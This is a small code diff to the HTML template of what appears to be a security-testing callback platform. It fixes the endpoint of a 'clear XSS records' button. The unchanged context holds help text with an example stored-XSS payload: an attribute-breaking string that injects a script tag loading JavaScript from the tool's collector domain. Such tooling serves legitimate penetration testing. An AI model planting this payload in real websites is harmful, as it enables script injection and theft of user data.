@@ -208,7 +208,7 @@ HTML_TMEPLATE = '''
                         <p><b>使用帮助：</b><br> 用于测试储存型xss漏洞
                             <br> JS地址：http://x.{domain}/xss/test/js test可自定义，用于项目区分<br> 例如：<code>'"/>&lt;script src=http://x.{domain}/xss/test/js&gt;&lt;/script&gt;</code>
                         </p>
-                        <button type="button" class="btn btn-default" onclick="send_ajax('/del/http')">清空XSS记录</button>
+                        <button type="button" class="btn btn-default" onclick="send_ajax('/del/xss')">清空XSS记录</button>
                     </div>
                     <table id="xss_table" style="word-break:break-all; word-wrap:break-all;">
                     </table>
